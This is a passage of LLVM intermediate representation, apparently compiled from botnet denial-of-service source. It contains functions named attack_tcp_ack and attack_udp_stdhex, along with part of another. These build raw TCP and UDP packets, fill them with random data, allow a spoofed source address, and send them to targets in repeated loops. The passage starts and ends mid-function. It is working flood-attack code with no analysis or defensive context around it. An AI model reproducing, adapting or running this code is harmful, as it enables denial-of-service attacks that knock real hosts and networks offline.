  %253 = bitcast i8* %252 to i16*
  store i16 0, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %251, %250
  br i1 %118, label %255, label %258

; <label>:255:                                    ; preds = %254
  %256 = getelementptr inbounds i8, i8* %230, i64 24
  %257 = bitcast i8* %256 to i32*
  store i32 0, i32* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %255, %254
  br i1 %119, label %259, label %262

; <label>:259:                                    ; preds = %258
  %260 = getelementptr inbounds i8, i8* %230, i64 28
  %261 = bitcast i8* %260 to i32*
  store i32 0, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %259, %258
  br i1 %120, label %266, label %263

; <label>:263:                                    ; preds = %262
  %264 = getelementptr inbounds i8, i8* %230, i64 38
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %263
  %267 = getelementptr inbounds i8, i8* %230, i64 10
  %268 = bitcast i8* %267 to i16*
  store i16 0, i16* %268, align 2
  %269 = bitcast i8* %230 to i16*
  %270 = call zeroext i16 @checksum_generic(i16* %269, i32 20)
  store i16 %270, i16* %268, align 2
  %271 = getelementptr inbounds i8, i8* %230, i64 36
  %272 = bitcast i8* %271 to i16*
  store i16 0, i16* %272, align 4
  %273 = call zeroext i16 @htons(i16 zeroext 40) #11
  %274 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %231, i8* %232, i16 zeroext %273, i32 40)
  store i16 %274, i16* %272, align 4
  %275 = getelementptr inbounds i8, i8* %230, i64 22
  %276 = bitcast i8* %275 to i16*
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %228, i32 0
  %280 = bitcast %struct.sockaddr_in* %279 to %struct.sockaddr*
  %281 = call i64 @sendto(i32 %37, i8* %230, i64 60, i32 16384, %struct.sockaddr* %280, i32 16) #10
  %282 = load i32, i32* %5, align 4
  %283 = add nsw i32 %282, 1
  store i32 %283, i32* %5, align 4
  %284 = icmp slt i32 %283, %43
  br i1 %284, label %.lr.ph.split, label %.loopexit.loopexit141

; <label>:285:                                    ; preds = %4, %109
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %280, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %107, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = or i16 %68, 80
  %70 = icmp eq i8 %28, 0
  %71 = or i16 %68, 2128
  br i1 %50, label %.lr.ph129.split.us.preheader, label %.lr.ph129.split.preheader

.lr.ph129.split.preheader:                        ; preds = %.lr.ph129
  %.135 = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split

.lr.ph129.split.us.preheader:                     ; preds = %.lr.ph129
  %. = select i1 %70, i16 %69, i16 %71
  br label %.lr.ph129.split.us

.lr.ph129.split.us:                               ; preds = %.lr.ph129.split.us.preheader, %.lr.ph129.split.us
  %72 = phi i32 [ %105, %.lr.ph129.split.us ], [ 0, %.lr.ph129.split.us.preheader ]
  %73 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %74 = sext i32 %72 to i64
  %75 = getelementptr inbounds i8*, i8** %8, i64 %74
  store i8* %73, i8** %75, align 8
  %76 = getelementptr inbounds i8, i8* %73, i64 20
  %77 = getelementptr inbounds i8, i8* %73, i64 40
  store i8 69, i8* %73, align 4
  %78 = getelementptr inbounds i8, i8* %73, i64 1
  store i8 %10, i8* %78, align 1
  %79 = call zeroext i16 @htons(i16 zeroext %49) #11
  %80 = getelementptr inbounds i8, i8* %73, i64 2
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 2
  %82 = call zeroext i16 @htons(i16 zeroext %12) #11
  %83 = getelementptr inbounds i8, i8* %73, i64 4
  %84 = bitcast i8* %83 to i16*
  store i16 %82, i16* %84, align 4
  %85 = getelementptr inbounds i8, i8* %73, i64 8
  store i8 %14, i8* %85, align 4
  %86 = getelementptr inbounds i8, i8* %73, i64 9
  store i8 6, i8* %86, align 1
  %87 = getelementptr inbounds i8, i8* %73, i64 12
  %88 = bitcast i8* %87 to i32*
  store i32 %39, i32* %88, align 4
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %74, i32 1
  %90 = load i32, i32* %89, align 4
  %91 = getelementptr inbounds i8, i8* %73, i64 16
  %92 = bitcast i8* %91 to i32*
  store i32 %90, i32* %92, align 4
  %93 = call zeroext i16 @htons(i16 zeroext %18) #11
  %94 = bitcast i8* %76 to i16*
  store i16 %93, i16* %94, align 4
  %95 = call zeroext i16 @htons(i16 zeroext %20) #11
  %96 = getelementptr inbounds i8, i8* %73, i64 22
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext %51) #11
  %99 = zext i16 %98 to i32
  %100 = getelementptr inbounds i8, i8* %73, i64 24
  %101 = bitcast i8* %100 to i32*
  store i32 %99, i32* %101, align 4
  %102 = getelementptr inbounds i8, i8* %73, i64 32
  %103 = bitcast i8* %102 to i16*
  store i16 %., i16* %103, align 4
  call void @rand_str(i8* nonnull %77, i32 %35)
  %104 = load i32, i32* %5, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %5, align 4
  %106 = icmp slt i32 %105, %46
  br i1 %106, label %.lr.ph129.split.us, label %.preheader.loopexit

; <label>:107:                                    ; preds = %42
  %108 = call i32 @close(i32 %40) #10
  br label %280

.preheader.loopexit:                              ; preds = %.lr.ph129.split.us
  br label %.preheader

.preheader.loopexit139:                           ; preds = %.lr.ph129.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit139, %.preheader.loopexit, %.preheader127
  %109 = icmp eq i32 %39, -1
  %110 = and i32 %11, 65535
  %111 = icmp eq i32 %110, 65535
  %112 = and i32 %17, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %19, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = icmp eq i32 %21, 65535
  %117 = icmp eq i32 %22, 65535
  %118 = icmp eq i8 %37, 0
  %119 = sext i32 %35 to i64
  %120 = add nsw i64 %119, 20
  %121 = trunc i64 %120 to i16
  %122 = trunc i64 %120 to i32
  %123 = add nsw i64 %119, 40
  br label %.loopexit

.lr.ph129.split:                                  ; preds = %.lr.ph129.split.preheader, %.lr.ph129.split
  %124 = phi i32 [ %160, %.lr.ph129.split ], [ 0, %.lr.ph129.split.preheader ]
  %125 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %126 = sext i32 %124 to i64
  %127 = getelementptr inbounds i8*, i8** %8, i64 %126
  store i8* %125, i8** %127, align 8
  %128 = getelementptr inbounds i8, i8* %125, i64 20
  %129 = getelementptr inbounds i8, i8* %125, i64 40
  store i8 69, i8* %125, align 4
  %130 = getelementptr inbounds i8, i8* %125, i64 1
  store i8 %10, i8* %130, align 1
  %131 = call zeroext i16 @htons(i16 zeroext %49) #11
  %132 = getelementptr inbounds i8, i8* %125, i64 2
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %12) #11
  %135 = getelementptr inbounds i8, i8* %125, i64 4
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 4
  %137 = getelementptr inbounds i8, i8* %125, i64 8
  store i8 %14, i8* %137, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %139 = getelementptr inbounds i8, i8* %125, i64 6
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = getelementptr inbounds i8, i8* %125, i64 9
  store i8 6, i8* %141, align 1
  %142 = getelementptr inbounds i8, i8* %125, i64 12
  %143 = bitcast i8* %142 to i32*
  store i32 %39, i32* %143, align 4
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %126, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = getelementptr inbounds i8, i8* %125, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext %18) #11
  %149 = bitcast i8* %128 to i16*
  store i16 %148, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %20) #11
  %151 = getelementptr inbounds i8, i8* %125, i64 22
  %152 = bitcast i8* %151 to i16*
  store i16 %150, i16* %152, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %51) #11
  %154 = zext i16 %153 to i32
  %155 = getelementptr inbounds i8, i8* %125, i64 24
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = getelementptr inbounds i8, i8* %125, i64 32
  %158 = bitcast i8* %157 to i16*
  store i16 %.135, i16* %158, align 4
  call void @rand_str(i8* nonnull %129, i32 %35)
  %159 = load i32, i32* %5, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %5, align 4
  %161 = icmp slt i32 %160, %46
  br i1 %161, label %.lr.ph129.split, label %.preheader.loopexit139

.loopexit.loopexit:                               ; preds = %201
  br label %.loopexit.backedge

.loopexit.loopexit138:                            ; preds = %259
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit138
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %109, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %201
  %storemerge121128.us = phi i32 [ %220, %201 ], [ 0, %.lr.ph.split.us.preheader ]
  %162 = sext i32 %storemerge121128.us to i64
  %163 = getelementptr inbounds i8*, i8** %8, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  %166 = getelementptr inbounds i8, i8* %164, i64 20
  %167 = getelementptr inbounds i8, i8* %164, i64 40
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = icmp ult i8 %169, 32
  br i1 %170, label %171, label %178

; <label>:171:                                    ; preds = %.lr.ph.split.us
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = call i32 @ntohl(i32 %173) #11
  %175 = call i32 @htonl(i32 %174) #11
  %176 = getelementptr inbounds i8, i8* %164, i64 16
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %.lr.ph.split.us, %171
  %179 = getelementptr inbounds i8, i8* %164, i64 12
  %180 = bitcast i8* %179 to i32*
  store i32 0, i32* %180, align 4
  br i1 %111, label %181, label %184

; <label>:181:                                    ; preds = %178
  %182 = getelementptr inbounds i8, i8* %164, i64 4
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %181, %178
  br i1 %113, label %185, label %187

; <label>:185:                                    ; preds = %184
  %186 = bitcast i8* %166 to i16*
  store i16 0, i16* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %185, %184
  br i1 %115, label %188, label %191

; <label>:188:                                    ; preds = %187
  %189 = getelementptr inbounds i8, i8* %164, i64 22
  %190 = bitcast i8* %189 to i16*
  store i16 0, i16* %190, align 2
  br label %191

; <label>:191:                                    ; preds = %188, %187
  br i1 %116, label %192, label %195

; <label>:192:                                    ; preds = %191
  %193 = getelementptr inbounds i8, i8* %164, i64 24
  %194 = bitcast i8* %193 to i32*
  store i32 0, i32* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %192, %191
  br i1 %117, label %196, label %199

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds i8, i8* %164, i64 28
  %198 = bitcast i8* %197 to i32*
  store i32 0, i32* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %196, %195
  br i1 %118, label %201, label %200

; <label>:200:                                    ; preds = %199
  call void @rand_str(i8* nonnull %167, i32 %35)
  %.pre132 = load i32, i32* %5, align 4
  br label %201

; <label>:201:                                    ; preds = %200, %199
  %202 = phi i32 [ %.pre132, %200 ], [ %storemerge121128.us, %199 ]
  %203 = getelementptr inbounds i8, i8* %164, i64 10
  %204 = bitcast i8* %203 to i16*
  store i16 0, i16* %204, align 2
  %205 = bitcast i8* %164 to i16*
  %206 = call zeroext i16 @checksum_generic(i16* %205, i32 20)
  store i16 %206, i16* %204, align 2
  %207 = getelementptr inbounds i8, i8* %164, i64 36
  %208 = bitcast i8* %207 to i16*
  store i16 0, i16* %208, align 4
  %209 = call zeroext i16 @htons(i16 zeroext %121) #11
  %210 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %165, i8* nonnull %166, i16 zeroext %209, i32 %122)
  store i16 %210, i16* %208, align 4
  %211 = getelementptr inbounds i8, i8* %164, i64 22
  %212 = bitcast i8* %211 to i16*
  %213 = load i16, i16* %212, align 2
  %214 = sext i32 %202 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0, i32 1
  store i16 %213, i16* %215, align 2
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0
  %217 = bitcast %struct.sockaddr_in* %216 to %struct.sockaddr*
  %218 = call i64 @sendto(i32 %40, i8* nonnull %164, i64 %123, i32 16384, %struct.sockaddr* %217, i32 16) #10
  %219 = load i32, i32* %5, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = icmp slt i32 %220, %46
  br i1 %221, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %259
  %storemerge121128 = phi i32 [ %278, %259 ], [ 0, %.lr.ph.split.preheader ]
  %222 = sext i32 %storemerge121128 to i64
  %223 = getelementptr inbounds i8*, i8** %8, i64 %222
  %224 = load i8*, i8** %223, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  %226 = getelementptr inbounds i8, i8* %224, i64 20
  %227 = getelementptr inbounds i8, i8* %224, i64 40
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 2
  %229 = load i8, i8* %228, align 4
  %230 = icmp ult i8 %229, 32
  br i1 %230, label %231, label %238

; <label>:231:                                    ; preds = %.lr.ph.split
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = call i32 @ntohl(i32 %233) #11
  %235 = call i32 @htonl(i32 %234) #11
  %236 = getelementptr inbounds i8, i8* %224, i64 16
  %237 = bitcast i8* %236 to i32*
  store i32 %235, i32* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %.lr.ph.split, %231
  br i1 %111, label %239, label %242

; <label>:239:                                    ; preds = %238
  %240 = getelementptr inbounds i8, i8* %224, i64 4
  %241 = bitcast i8* %240 to i16*
  store i16 0, i16* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %239, %238
  br i1 %113, label %243, label %245

; <label>:243:                                    ; preds = %242
  %244 = bitcast i8* %226 to i16*
  store i16 0, i16* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %243, %242
  br i1 %115, label %246, label %249

; <label>:246:                                    ; preds = %245
  %247 = getelementptr inbounds i8, i8* %224, i64 22
  %248 = bitcast i8* %247 to i16*
  store i16 0, i16* %248, align 2
  br label %249

; <label>:249:                                    ; preds = %246, %245
  br i1 %116, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %224, i64 24
  %252 = bitcast i8* %251 to i32*
  store i32 0, i32* %252, align 4
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %117, label %254, label %257

; <label>:254:                                    ; preds = %253
  %255 = getelementptr inbounds i8, i8* %224, i64 28
  %256 = bitcast i8* %255 to i32*
  store i32 0, i32* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %254, %253
  br i1 %118, label %259, label %258

; <label>:258:                                    ; preds = %257
  call void @rand_str(i8* %227, i32 %35)
  %.pre = load i32, i32* %5, align 4
  br label %259

; <label>:259:                                    ; preds = %257, %258
  %260 = phi i32 [ %storemerge121128, %257 ], [ %.pre, %258 ]
  %261 = getelementptr inbounds i8, i8* %224, i64 10
  %262 = bitcast i8* %261 to i16*
  store i16 0, i16* %262, align 2
  %263 = bitcast i8* %224 to i16*
  %264 = call zeroext i16 @checksum_generic(i16* %263, i32 20)
  store i16 %264, i16* %262, align 2
  %265 = getelementptr inbounds i8, i8* %224, i64 36
  %266 = bitcast i8* %265 to i16*
  store i16 0, i16* %266, align 4
  %267 = call zeroext i16 @htons(i16 zeroext %121) #11
  %268 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %225, i8* %226, i16 zeroext %267, i32 %122)
  store i16 %268, i16* %266, align 4
  %269 = getelementptr inbounds i8, i8* %224, i64 22
  %270 = bitcast i8* %269 to i16*
  %271 = load i16, i16* %270, align 2
  %272 = sext i32 %260 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %271, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %224, i64 %123, i32 16384, %struct.sockaddr* %275, i32 16) #10
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph.split, label %.loopexit.loopexit138

; <label>:280:                                    ; preds = %4, %107
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_stdhex(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %52
  %indvars.iv = phi i64 [ %indvars.iv.next, %52 ], [ 0, %.lr.ph65.split.us.preheader ]
  %33 = call i32 @rand() #10
  %34 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %35 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %34, i8** %35, align 8
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %37 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %37, align 2
  %38 = call i32 @socket(i32 2, i32 2, i32 0) #10
  %39 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %38, i32* %39, align 4
  %40 = icmp eq i32 %38, -1
  br i1 %40, label %.us-lcssa.us.loopexit, label %41

; <label>:41:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %42 = call i32 @bind(i32 %38, %struct.sockaddr* nonnull %31, i32 16) #10
  %43 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %44 = load i8, i8* %43, align 4
  %45 = icmp ult i8 %44, 32
  br i1 %45, label %46, label %52

; <label>:46:                                     ; preds = %41
  %47 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %48 = load i32, i32* %47, align 4
  %49 = call i32 @ntohl(i32 %48) #11
  %50 = call i32 @htonl(i32 %49) #11
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %50, i32* %51, align 4
  br label %52

; <label>:52:                                     ; preds = %46, %41
  %53 = bitcast %struct.attack_target* %36 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %38, %struct.sockaddr* %53, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %55 = icmp slt i64 %indvars.iv.next, %32
  br i1 %55, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %52
  br label %.preheader

.preheader.loopexit78:                            ; preds = %94
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %56 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %57 = zext i32 %.mask to i64
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %56, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %56, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %58 = sext i32 %.160.us61 to i64
  %59 = getelementptr inbounds i8*, i8** %8, i64 %58
  %60 = load i8*, i8** %59, align 8
  call void @rand_str(i8* %60, i32 %.mask)
  %61 = getelementptr inbounds i32, i32* %10, i64 %58
  %62 = load i32, i32* %61, align 4
  %63 = call i64 @send(i32 %62, i8* %60, i64 %57, i32 16384) #10
  %64 = add nsw i32 %.160.us61, 1
  %65 = icmp slt i32 %64, %24
  %brmerge66 = or i1 %65, %.not
  %.mux67 = select i1 %65, i32 %64, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %66 = sext i32 %.160.us.us to i64
  %67 = getelementptr inbounds i8*, i8** %8, i64 %66
  %68 = load i8*, i8** %67, align 8
  %69 = getelementptr inbounds i32, i32* %10, i64 %66
  %70 = load i32, i32* %69, align 4
  %71 = call i64 @send(i32 %70, i8* %68, i64 %57, i32 16384) #10
  %72 = add nsw i32 %.160.us.us, 1
  %73 = icmp slt i32 %72, %24
  %brmerge = or i1 %73, %56
